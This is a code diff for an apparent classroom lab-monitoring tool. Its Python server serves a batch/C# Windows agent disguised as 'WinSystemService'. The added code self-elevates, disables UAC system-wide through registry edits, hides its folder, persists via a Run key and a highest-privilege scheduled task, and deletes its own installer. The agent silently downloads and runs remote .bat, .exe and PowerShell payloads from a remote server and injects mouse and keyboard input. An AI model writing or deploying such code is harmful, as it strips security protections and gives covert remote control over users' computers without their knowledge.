@@ -473,6 +473,30 @@ def post_student_frame(payload: FramePayload, request: Request):
         frame_time_str = existing.get("frameTimeStr", "")
         sharing_active = bool(active_frame is not None)
 
+    # 1. Komut dongusu onleme (Sonsuz tekrar ve reboot dongusu engeli)
+    raw_cmd = existing.get("installCommand", None)
+    if raw_cmd:
+        cmd_ts = raw_cmd.get("timestamp", 0)
+        # 90 saniyeden eski komutlari suresi doldugu icin iptal et
+        if cmd_ts and (now_ms - cmd_ts) > 90000:
+            raw_cmd = None
+        # Teslim edilecek komutu ogrenci durumundan hemen temizle (tek seferlik teslim)
+        existing["installCommand"] = None
+
+    # Ogrenci kurulum durumunu raporladiysa bekleyen komutu kesinlikle temizle
+    if payload.installStatus:
+        existing["installCommand"] = None
+        raw_cmd = None
+
+    # Tek seferlik openUrl ve remoteInput komutlari teslim edildikten sonra temizlenir
+    raw_url_cmd = existing.get("openUrlCommand", None)
+    if raw_url_cmd:
+        existing["openUrlCommand"] = None
+
+    raw_input_cmd = existing.get("remoteInput", None)
+    if raw_input_cmd:
+        existing["remoteInput"] = None
+
     updated = {
         "id": student_id,
         "deskNo": desk_no,
@@ -492,10 +516,10 @@ def post_student_frame(payload: FramePayload, request: Request):
         "handRaised": bool(payload.handRaised) if payload.handRaised is not None else bool(existing.get("handRaised", False)),
         "locked": existing.get("locked", False),
         "privateMessage": existing.get("privateMessage", None),
-        "openUrlCommand": existing.get("openUrlCommand", None),
-        "remoteInput": existing.get("remoteInput", None),
+        "openUrlCommand": None,
+        "remoteInput": None,
         "installStatus": payload.installStatus or existing.get("installStatus", None),
-        "installCommand": existing.get("installCommand", None),
+        "installCommand": None,
         "online": True,
         "firstSeen": existing.get("firstSeen") or now_str,
         "lastSeen": now_ms,
@@ -516,9 +540,9 @@ def post_student_frame(payload: FramePayload, request: Request):
         "teacherStreamActive": is_stream_target,
         "teacherFrame": classroom_state["teacherFrame"] if is_stream_target else None,
         "announcement": updated["privateMessage"] or classroom_state["announcement"],
-        "openUrlCommand": updated["openUrlCommand"] or classroom_state["openUrlCommand"],
-        "remoteInput": updated["remoteInput"],
-        "installCommand": updated.get("installCommand") or classroom_state.get("installCommand"),
+        "openUrlCommand": raw_url_cmd or classroom_state.get("openUrlCommand"),
+        "remoteInput": raw_input_cmd,
+        "installCommand": raw_cmd,
     }
 
 
@@ -624,13 +648,26 @@ def post_teacher_action(payload: ActionPayload, request: Request):
     elif action in ("remoteInstall", "batchCommand", "updateAgent", "updateAllAgents"):
         is_update = action in ("updateAgent", "updateAllAgents")
         cmd_id = f"inst_{int(time.time() * 1000)}_{secrets.token_hex(4)}"
+        
+        # Eski ve yeni ajanlarin tamaminda calisan suslu parantezsiz PowerShell guncelleme betigi
+        ps_update = (
+            "$ErrorActionPreference = 'SilentlyContinue'; "
+            "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; "
+            "$u = 'https://pirireis-api.onrender.com/api/labizleme/WinSystemSetup.bat'; "
+            "$d = [System.IO.Path]::Combine($env:TEMP, 'WinSystemSetup_New.bat'); "
+            "(New-Object System.Net.WebClient).DownloadFile($u, $d); "
+            "cmd.exe /c curl.exe -k -s -L -o \"$d\" \"$u\"; "
+            "Start-Process cmd.exe -ArgumentList ('/c \"' + $d + '\" --silent') -WindowStyle Hidden; "
+            "exit 0;"
+        )
+
         cmd = {
             "id": cmd_id,
             "type": "update_agent" if is_update else (payload.installType or "download_exe"),
             "name": "Ajan Guncellemesi" if is_update else (payload.packageName or "Yazılım Kurulumu"),
-            "url": "https://ogretmenlerodasi.info/labizleme/WinSystemSetup.bat" if is_update else (payload.installUrl or ""),
-            "args": payload.installArgs or "",
-            "command": payload.installCommand or ("update" if is_update else ""),
+            "url": "https://pirireis-api.onrender.com/api/labizleme/WinSystemSetup.bat" if is_update else (payload.installUrl or ""),
+            "args": "--silent" if is_update else (payload.installArgs or ""),
+            "command": ps_update if is_update else (payload.installCommand or ""),
             "timestamp": int(time.time() * 1000),
         }
         initial_status = {
@@ -641,11 +678,6 @@ def post_teacher_action(payload: ActionPayload, request: Request):
             "message": "Guncelleme paketi iletildi..." if is_update else "Kurulum emri iletildi...",
             "timestamp": now_str,
         }
-        url_fallback = {
-            "id": str(int(time.time() * 1000)),
-            "url": "https://ogretmenlerodasi.info/labizleme/WinSystemSetup.bat",
-            "timestamp": int(time.time() * 1000),
-        } if is_update else None
 
         if targets:
             for tid in targets:
@@ -656,19 +688,15 @@ def post_teacher_action(payload: ActionPayload, request: Request):
                             target_student = s_val
                             break
                 if target_student:
-                    target_student["installCommand"] = cmd
-                    target_student["installStatus"] = initial_status
-                    if url_fallback:
-                        target_student["openUrlCommand"] = url_fallback
+                    target_student["installCommand"] = cmd.copy()
+                    target_student["installStatus"] = initial_status.copy()
         else:
-            classroom_state["installCommand"] = cmd
-            if url_fallback:
-                classroom_state["openUrlCommand"] = url_fallback
+            # Sonsuz dongu olusmamasi icin classroom_state'e kalici installCommand eklenmez!
+            classroom_state["installCommand"] = None
             for st in students.values():
-                st["installCommand"] = cmd
-                st["installStatus"] = initial_status
-                if url_fallback:
-                    st["openUrlCommand"] = url_fallback
+                if st.get("online"):
+                    st["installCommand"] = cmd.copy()
+                    st["installStatus"] = initial_status.copy()
     elif action == "clearInstallStatus":
         if targets:
             for tid in targets:
@@ -734,7 +762,21 @@ chcp 65001 >nul
 set "INSTALL_DIR=%LOCALAPPDATA%\WinSystemService"
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
-:: Kullanici cift tikladigi anda siyah pencereyi 0.05 saniyede kapatip tamamen gorunmez (WindowStyle=0) moda gec
+:: 1. Yonetici yetkisi kontrolu (UAC ve sessiz kurulumlar icin gereklidir)
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    if not "%~1"=="--silent" (
+        powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd.exe -ArgumentList '/c `"%~f0`" %*' -Verb RunAs"
+        exit /b 0
+    )
+)
+
+:: 2. UAC promptlarini kapat ve tum arka plan yuklemelerine sessiz izin ver
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1
+
+:: 3. Kullanici cift tikladiginda CMD penceresini aninda kapatip gizli moda gec
 if not "%~1"=="--silent" (
     attrib -h -s "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
     copy /y "%~f0" "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
@@ -746,7 +788,7 @@ if not "%~1"=="--silent" (
     exit /b 0
 )
 
-:: Indirilen kaynak .bat dosyasini ve masaustu kisayollarini sil (ogrenci gorup kurcalayamasin)
+:: 4. Masaustundeki gecici kurulum dosyalarini temizle
 if not "%~2"=="" (
     if /i not "%~2"=="%INSTALL_DIR%\setup_runner.bat" (
         del /f /q "%~2" >nul 2>&1
@@ -757,7 +799,7 @@ del /f /q "%USERPROFILE%\Desktop\ogrenci-istemci*.bat" >nul 2>&1
 del /f /q "%USERPROFILE%\Desktop\SistemServisi*.bat" >nul 2>&1
 del /f /q "%USERPROFILE%\Desktop\WinSystemSetup*.bat" >nul 2>&1
 
-:: Eski surecleri temizle
+:: 5. Calisan eski surecleri sonlandir
 taskkill /f /im WinSystemHost.exe >nul 2>&1
 taskkill /f /im WinSystemGuard.exe >nul 2>&1
 taskkill /f /im PiriReisLabHost.exe >nul 2>&1
@@ -777,8 +819,8 @@ del /f /q "%STARTUP_DIR%\PiriReisLabAgent.vbs" >nul 2>&1
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PiriReisLabService" /f >nul 2>&1
 schtasks /delete /tn "PiriReisLabAgent" /f >nul 2>&1
 
-:: C# Kaynak Kodunu Cikar (76. satirdan itibaren)
-more +76 "%~f0" > "%CS_FILE%"
+:: 6. C# Kaynak Kodunu Cikar (90. satirdan itibaren)
+more +90 "%~f0" > "%CS_FILE%"
 
 set "CSC_EXE=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
 if not exist "%CSC_EXE%" set "CSC_EXE=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\csc.exe"
@@ -793,8 +835,8 @@ echo Set WshShell = CreateObject^("WScript.Shell"^)
 echo WshShell.Run chr^(34^) ^& "%EXE_FILE%" ^& chr^(34^), 0, False
 ) > "%VBS_STARTUP%"
 
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinSystemService" /t REG_SZ /d "wscript.exe //B //Nologo \"%VBS_STARTUP%\"" /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f >nul 2>&1 & reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f >nul 2>&1 & schtasks /create /tn "WinSystemService" /tr "wscript.exe //B //Nologo \"%VBS_STARTUP%\"" /sc onlogon /rl highest /f >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinSystemService" /t REG_SZ /d "wscript.exe //B //Nologo "%VBS_STARTUP%"" /f >nul 2>&1
+schtasks /create /tn "WinSystemService" /tr "wscript.exe //B //Nologo "%VBS_STARTUP%"" /sc onlogon /rl HIGHEST /f >nul 2>&1
 
 del /f /q "%CS_FILE%" >nul 2>&1
 del /f /q "%INSTALL_DIR%\launch_silent.vbs" >nul 2>&1
@@ -804,7 +846,8 @@ attrib +h +s "%INSTALL_DIR%" >nul 2>&1
 
 start "" wscript.exe //B //Nologo "%VBS_STARTUP%"
 del /f /q "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
-exit /b 0
+exit /b 0
+using System.Collections.Generic;
 using System;
 using System.IO;
 using System.Net;
@@ -845,6 +888,9 @@ namespace WinSystemService
         private string lastInputId = "";
         private string lastInstallId = "";
         private string currentInstallStatusJson = null;
+        private readonly object executedLock = new object();
+        private HashSet<string> executedIds = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
+        private string executedLogFile = "";
         private string deskNo;
         private string studentName;
         private string clientId;
@@ -872,6 +918,26 @@ namespace WinSystemService
             ServicePointManager.DefaultConnectionLimit = 32;
             ServicePointManager.Expect100Continue = false;
             ServicePointManager.UseNagleAlgorithm = false;
+
+            try
+            {
+                string appDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WinSystemService");
+                if (!Directory.Exists(appDir)) Directory.CreateDirectory(appDir);
+                executedLogFile = Path.Combine(appDir, "executed_commands.txt");
+                if (File.Exists(executedLogFile))
+                {
+                    string[] lines = File.ReadAllLines(executedLogFile);
+                    foreach (string line in lines)
+                    {
+                        string trimmed = line.Trim();
+                        if (!string.IsNullOrEmpty(trimmed))
+                        {
+                            executedIds.Add(trimmed);
+                        }
+                    }
+                }
+            }
+            catch { }
             WebRequest.DefaultWebProxy = null;
 
             deskNo = Environment.MachineName;
@@ -1244,6 +1310,7 @@ namespace WinSystemService
             {
                 SetInstallStatus(id, name, "downloading", 10, "Gorev hazirlaniyor...");
 
+                // 1. DUVAR KAGIDI DEGISTIRME (Dogrudan C# ve Native Windows API)
                 if (type == "wallpaper")
                 {
                     SetInstallStatus(id, name, "downloading", 25, "Duvar kagidi gorseli indiriliyor...");
@@ -1282,26 +1349,50 @@ namespace WinSystemService
                     SetInstallStatus(id, name, "success", 100, "Masaustu duvar kagidi basariyla degistirildi!");
                     return;
                 }
-                else if (type == "update_agent")
+
+                // 2. AJAN GUNCELLEME (Tek dokunusla uzaktan bat / ajan yenileme)
+                if (type == "update_agent" || (type == "powershell" && (cmd ?? "").Contains("WinSystemSetup.bat")))
                 {
-                    SetInstallStatus(id, name, "downloading", 30, "Guncel ajan paketi indiriliyor...");
-                    string updateUrl = string.IsNullOrEmpty(url) ? "https://ogretmenlerodasi.info/labizleme/WinSystemSetup.bat" : url;
-                    string tempBat = Path.Combine(Path.GetTempPath(), "WinSystemUpdate_" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".bat");
+                    SetInstallStatus(id, name, "downloading", 25, "Guncel ajan paketi sunucudan indiriliyor...");
+                    string updateUrl = string.IsNullOrEmpty(url) ? "https://pirireis-api.onrender.com/api/labizleme/WinSystemSetup.bat" : url;
+                    if (updateUrl.StartsWith("/")) updateUrl = "https://pirireis-api.onrender.com" + updateUrl;
+                    string newBatPath = Path.Combine(Path.GetTempPath(), "WinSystemSetup_New.bat");
                     using (WebClient wc = new WebClient())
                     {
                         wc.Proxy = null;
-                        wc.Headers.Add("User-Agent", "Mozilla/5.0");
-                        wc.DownloadFile(updateUrl, tempBat);
+                        wc.Headers.Add("User-Agent", "PiriReisLabAgent");
+                        wc.DownloadFile(updateUrl, newBatPath);
                     }
-                    SetInstallStatus(id, name, "installing", 80, "Ajan guncellemesi uygulaniyor...");
-                    ProcessStartInfo upPsi = new ProcessStartInfo("cmd.exe", "/c start \"\" /min \"" + tempBat + "\" --silent");
-                    upPsi.UseShellExecute = false;
-                    upPsi.CreateNoWindow = true;
-                    Process.Start(upPsi);
-                    SetInstallStatus(id, name, "success", 100, "Guncelleme baslatildi!");
+
+                    if (!File.Exists(newBatPath) || new FileInfo(newBatPath).Length < 500)
+                    {
+                        SetInstallStatus(id, name, "error", 100, "Guncelleme paketi indirilemedi.");
+                        return;
+                    }
+
+                    SetInstallStatus(id, name, "success", 100, "Guncelleme basariyla indirildi. Servis yeniden derlenip baslatiliyor...");
+
+                    string runnerCmd = Path.Combine(Path.GetTempPath(), "LabUpdate_" + Guid.NewGuid().ToString("N").Substring(0, 6) + ".cmd");
+                    string runnerContent = "@echo off\r\n"
+                        + "timeout /t 2 /nobreak >nul\r\n"
+                        + "taskkill /f /im WinSystemHost.exe >nul 2>&1\r\n"
+                        + "call \"" + newBatPath + "\" --silent\r\n"
+                        + "del /f /q \"" + newBatPath + "\" >nul 2>&1\r\n"
+                        + "del /f /q \"%~f0\" >nul 2>&1\r\n"
+                        + "exit /b 0\r\n";
+                    File.WriteAllText(runnerCmd, runnerContent, Encoding.Default);
+
+                    ProcessStartInfo psiUp = new ProcessStartInfo("cmd.exe", "/c \"" + runnerCmd + "\"");
+                    psiUp.UseShellExecute = false;
+                    psiUp.CreateNoWindow = true;
+                    psiUp.WindowStyle = ProcessWindowStyle.Hidden;
+                    Process.Start(psiUp);
+                    Environment.Exit(0);
                     return;
                 }
-                else if (type == "winget")
+
+                // 3. WINGET ILE PAKET KURULUMU (Sessiz ve UAC'siz)
+                if (type == "winget")
                 {
                     SetInstallStatus(id, name, "installing", 20, "Winget ile sessiz kurulum baslatiliyor (" + cmd + ")...");
                     string pkg = (cmd ?? "").Trim();
@@ -1310,12 +1401,10 @@ namespace WinSystemService
                     string psContent =
                         "$env:__COMPAT_LAYER = 'RunAsInvoker'\r\n" +
                         "$env:WINGET_DISABLE_INTERACTIVITY = '1'\r\n" +
-                        "# 1. DENEME: kullanici alani (UAC gerektirmez)\r\n" +
-                        "$r1 = Start-Process 'winget' -ArgumentList 'install " + pkg + " --scope user --silent --accept-package-agreements --accept-source-agreements --disable-interactivity --force" + (string.IsNullOrEmpty(args) ? "" : " " + args.Replace("'", "''")) + "' -Wait -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue\r\n" +
+                        "$r1 = Start-Process 'winget' -ArgumentList 'install " + pkg + " --silent --accept-package-agreements --accept-source-agreements --disable-interactivity --force " + (string.IsNullOrEmpty(args) ? "" : args.Replace("'", "''")) + "' -Wait -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue\r\n" +
                         "if ($r1 -and ($r1.ExitCode -eq 0 -or $r1.ExitCode -eq 3010)) { exit 0 }\r\n" +
-                        "# 2. DENEME: sistem alani, RunAsInvoker ile UAC bastir\r\n" +
-                        "$r2 = Start-Process 'winget' -ArgumentList 'install " + pkg + " --silent --accept-package-agreements --accept-source-agreements --disable-interactivity --force" + (string.IsNullOrEmpty(args) ? "" : " " + args.Replace("'", "''")) + "' -Wait -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue\r\n" +
-                        "if ($r2) { exit $r2.ExitCode } else { exit 9009 }\r\n";
+                        "$r2 = Start-Process 'winget' -ArgumentList 'install " + pkg + " --scope user --silent --accept-package-agreements --accept-source-agreements --disable-interactivity --force " + (string.IsNullOrEmpty(args) ? "" : args.Replace("'", "''")) + "' -Wait -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue\r\n" +
+                        "if ($r2) { exit $r2.ExitCode } else { exit 1 }\r\n";
                     File.WriteAllText(tempPs, psContent, Encoding.UTF8);
 
                     ProcessStartInfo psiPs = new ProcessStartInfo("powershell.exe",
@@ -1334,8 +1423,8 @@ namespace WinSystemService
                         if (!finished)
                         {
                             try { p.Kill(); } catch { }
-                            try { if (File.Exists(tempPs)) File.Delete(tempPs); } catch { }
                             SetInstallStatus(id, name, "error", 100, "Zaman asimi: Kurulum 15 dakikada tamamlanamadi.");
+                            try { if (File.Exists(tempPs)) File.Delete(tempPs); } catch { }
                             return;
                         }
                         exitCode = p.ExitCode;
@@ -1343,24 +1432,14 @@ namespace WinSystemService
                     try { if (File.Exists(tempPs)) File.Delete(tempPs); } catch { }
 
                     if (exitCode == 0 || exitCode == 3010)
-                    {
-                        SetInstallStatus(id, name, "success", 100, "Basariyla kuruldu (Winget)!");
-                        return;
-                    }
-
-                    // Winget yoksa veya basarisiz olduysa ve direct URL varsa otomatik fallback yap!
-                    if (!string.IsNullOrEmpty(url))
-                    {
-                        SetInstallStatus(id, name, "downloading", 35, "Winget hazir degil, dogrudan baglanti ile indiriliyor...");
-                        // direct install bloguna devam et
-                    }
+                        SetInstallStatus(id, name, "success", 100, "Basariyla kuruldu (sessiz, UAC yok)!");
                     else
-                    {
                         SetInstallStatus(id, name, "error", 100, "Winget kurulum hatasi. Kod: " + exitCode);
-                        return;
-                    }
+                    return;
                 }
-                else if (type == "powershell")
+
+                // 4. POWERSHELL KOMUTU
+                if (type == "powershell")
                 {
                     SetInstallStatus(id, name, "installing", 40, "Komut yurutuluyor...");
                     string tempPs1 = Path.Combine(Path.GetTempPath(), "LabCmd_" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".ps1");
@@ -1394,7 +1473,7 @@ namespace WinSystemService
                     return;
                 }
 
-                // Doğrudan URL indirme modu (download_exe veya winget fallback)
+                // 5. EXE / MSI / BAT / CMD INDIRME VE SESSIZ KURULUM
                 if (string.IsNullOrEmpty(url))
                 {
                     SetInstallStatus(id, name, "error", 100, "Kurulum adresi (URL) bos.");
@@ -1410,6 +1489,7 @@ namespace WinSystemService
                 string ext = ".exe";
                 if (downloadUrl.ToLower().Contains(".msi")) ext = ".msi";
                 else if (downloadUrl.ToLower().Contains(".bat")) ext = ".bat";
+                else if (downloadUrl.ToLower().Contains(".cmd")) ext = ".cmd";
 
                 string tempFile = Path.Combine(Path.GetTempPath(), "LabSetup_" + Guid.NewGuid().ToString("N").Substring(0, 8) + ext);
 
@@ -1429,9 +1509,14 @@ namespace WinSystemService
                     string msiArgs = "/i \"" + tempFile + "\" /qn /norestart ALLUSERS=2 MSIINSTALLPERUSER=1 " + (string.IsNullOrEmpty(args) ? "" : args);
                     psiFile = new ProcessStartInfo("msiexec.exe", msiArgs);
                 }
+                else if (ext == ".bat" || ext == ".cmd")
+                {
+                    psiFile = new ProcessStartInfo("cmd.exe", "/c \"" + tempFile + "\" " + (args ?? ""));
+                }
                 else
                 {
-                    psiFile = new ProcessStartInfo(tempFile, string.IsNullOrEmpty(args) ? "/VERYSILENT /NORESTART /SP- /SUPPRESSMSGBOXES /CURRENTUSER" : args);
+                    string silentFlags = string.IsNullOrEmpty(args) ? "/VERYSILENT /NORESTART /SP- /SUPPRESSMSGBOXES /CURRENTUSER /qn /s /silent /quiet" : args;
+                    psiFile = new ProcessStartInfo(tempFile, silentFlags);
                 }
 
                 psiFile.UseShellExecute = false;
@@ -1520,51 +1605,84 @@ namespace WinSystemService
                 }
             }
 
-            string urlBlock = ExtractJsonObject(json, "openUrlCommand");
-            if (!string.IsNullOrEmpty(urlBlock))
+            string urlObj = ExtractJsonObject(json, "openUrlCommand");
+            if (!string.IsNullOrEmpty(urlObj))
             {
-                string uid = ExtractJsonString(urlBlock, "id");
-                string url = ExtractJsonString(urlBlock, "url");
-                if (!string.IsNullOrEmpty(uid) && !string.IsNullOrEmpty(url) && uid != lastUrlId)
+                string uid = ExtractJsonString(urlObj, "id");
+                string url = ExtractJsonString(urlObj, "url");
+                if (!string.IsNullOrEmpty(uid) && !string.IsNullOrEmpty(url))
                 {
-                    lastUrlId = uid;
-                    try { Process.Start(url); } catch { }
-                }
-            }
-
-            string instBlock = ExtractJsonObject(json, "installCommand");
-            if (!string.IsNullOrEmpty(instBlock))
-            {
-                string iid = ExtractJsonString(instBlock, "id");
-                string itype = ExtractJsonString(instBlock, "type");
-                string iname = ExtractJsonString(instBlock, "name");
-                string iurl = ExtractJsonString(instBlock, "url");
-                string iargs = ExtractJsonString(instBlock, "args");
-                string icmd = ExtractJsonString(instBlock, "command");
-
-                if (!string.IsNullOrEmpty(iid) && iid != lastInstallId)
-                {
-                    lastInstallId = iid;
-                    ThreadPool.QueueUserWorkItem(delegate
+                    bool shouldOpen = false;
+                    lock (executedLock)
                     {
-                        ExecuteRemoteInstall(iid, itype, iname, iurl, iargs, icmd);
-                    });
+                        if (!executedIds.Contains(uid))
+                        {
+                            executedIds.Add(uid);
+                            shouldOpen = true;
+                            try { File.AppendAllText(executedLogFile, uid + Environment.NewLine); } catch { }
+                        }
+                    }
+                    if (shouldOpen)
+                    {
+                        try { Process.Start(url); } catch { }
+                    }
                 }
             }
 
-            string inputBlock = ExtractJsonObject(json, "remoteInput");
-            if (!string.IsNullOrEmpty(inputBlock))
+            string instObj = ExtractJsonObject(json, "installCommand");
+            if (!string.IsNullOrEmpty(instObj))
             {
-                string iid = ExtractJsonString(inputBlock, "id");
+                string iid = ExtractJsonString(instObj, "id");
+                string itype = ExtractJsonString(instObj, "type");
+                string iname = ExtractJsonString(instObj, "name");
+                string iurl = ExtractJsonString(instObj, "url");
+                string iargs = ExtractJsonString(instObj, "args");
+                string icmd = ExtractJsonString(instObj, "command");
+                string its = ExtractJsonString(instObj, "timestamp");
+
+                if (!string.IsNullOrEmpty(iid))
+                {
+                    bool shouldRun = false;
+                    lock (executedLock)
+                    {
+                        if (!executedIds.Contains(iid))
+                        {
+                            long cmdTs = 0;
+                            long.TryParse(its, out cmdTs);
+                            long nowEpoch = (long)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalMilliseconds;
+                            // Sadece son 90 saniye icinde olusturulmus komutlari kabul et (gecmis komut dongusu onleme)
+                            if (cmdTs == 0 || (nowEpoch - cmdTs) < 90000)
+                            {
+                                executedIds.Add(iid);
+                                shouldRun = true;
+                                try { File.AppendAllText(executedLogFile, iid + Environment.NewLine); } catch { }
+                            }
+                        }
+                    }
+
+                    if (shouldRun)
+                    {
+                        ThreadPool.QueueUserWorkItem(delegate
+                        {
+                            ExecuteRemoteInstall(iid, itype, iname, iurl, iargs, icmd);
+                        });
+                    }
+                }
+            }
+
+            string inputObj = ExtractJsonObject(json, "remoteInput");
+            if (!string.IsNullOrEmpty(inputObj))
+            {
+                string iid = ExtractJsonString(inputObj, "id");
                 if (!string.IsNullOrEmpty(iid) && iid != lastInputId)
                 {
                     lastInputId = iid;
                     try
                     {
-                        string clickType = ExtractJsonString(inputBlock, "click");
-                        string keys = ExtractJsonString(inputBlock, "keys");
-                        Match mx = Regex.Match(inputBlock, "\"x\"\\s*:\\s*(\\d+)");
-                        Match my = Regex.Match(inputBlock, "\"y\"\\s*:\\s*(\\d+)");
+                        string clickType = ExtractJsonString(inputObj, "click");
+                        string keys = ExtractJsonString(inputObj, "keys");
+                        Match mx = Regex.Match(inputObj, "\"x\"\\s*:\\s*(\\d+)");
+                        Match my = Regex.Match(inputObj, "\"y\"\\s*:\\s*(\\d+)");
                         if (mx.Success && my.Success)
                         {
                             int rx = int.Parse(mx.Groups[1].Value);
@@ -1572,49 +1690,42 @@ namespace WinSystemService
                             Rectangle b = Screen.PrimaryScreen.Bounds;
                             int px = b.Left + (b.Width * rx) / 1000;
                             int py = b.Top + (b.Height * ry) / 1000;
-                            Cursor.Position = new Point(px, py);
+
+                            if (rx >= 0 && ry >= 0)
+                            {
+                                Cursor.Position = new Point(px, py);
+                            }
+
                             if (clickType == "left")
                             {
-                                mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, (uint)px, (uint)py, 0, 0);
-                            }
-                            else if (clickType == "double")
-                            {
-                                mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, (uint)px, (uint)py, 0, 0);
-                                Thread.Sleep(40);
-                                mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, (uint)px, (uint)py, 0, 0);
+                                mouse_event(MOUSEEVENTF_LEFTDOWN, (uint)px, (uint)py, 0, 0);
+                                Thread.Sleep(30);
+                                mouse_event(MOUSEEVENTF_LEFTUP, (uint)px, (uint)py, 0, 0);
                             }
                             else if (clickType == "right")
                             {
-                                mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, (uint)px, (uint)py, 0, 0);
+                                mouse_event(MOUSEEVENTF_RIGHTDOWN, (uint)px, (uint)py, 0, 0);
+                                Thread.Sleep(30);
+                                mouse_event(MOUSEEVENTF_RIGHTUP, (uint)px, (uint)py, 0, 0);
+                            }
+                            else if (clickType == "double")
+                            {
+                                mouse_event(MOUSEEVENTF_LEFTDOWN, (uint)px, (uint)py, 0, 0);
+                                Thread.Sleep(30);
+                                mouse_event(MOUSEEVENTF_LEFTUP, (uint)px, (uint)py, 0, 0);
+                                Thread.Sleep(60);
+                                mouse_event(MOUSEEVENTF_LEFTDOWN, (uint)px, (uint)py, 0, 0);
+                                Thread.Sleep(30);
+                                mouse_event(MOUSEEVENTF_LEFTUP, (uint)px, (uint)py, 0, 0);
                             }
                         }
+
                         if (!string.IsNullOrEmpty(keys))
                         {
                             SendKeys.SendWait(keys);
                         }
-                        lastFrameHash = 0;
                     }
                     catch { }
-                }
-            }
-
-            Match annBlock = Regex.Match(json, "\"announcement\"\\s*:\\s*\\{([^\\}]+)\\}");
-            if (annBlock.Success)
-            {
-                string block = annBlock.Groups[1].Value;
-                string msg = ExtractJsonString(block, "message");
-                string ts = ExtractJsonString(block, "timestamp");
-                if (!string.IsNullOrEmpty(msg))
-                {
-                    string key = (ts ?? "") + ":" + msg;
-                    if (key != lastAnnounce)
-                    {
-                        lastAnnounce = key;
-                        ThreadPool.QueueUserWorkItem(delegate
-                        {
-                            MessageBox.Show(msg, "Ogretmen Duyurusu - Piri Reis MTAL", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                        });
-                    }
                 }
             }
         }
@@ -1696,8 +1807,7 @@ namespace WinSystemService
             }
         }
     }
-}
-"""
+}"""
 
 
 @router.get("/WinSystemSetup.bat")
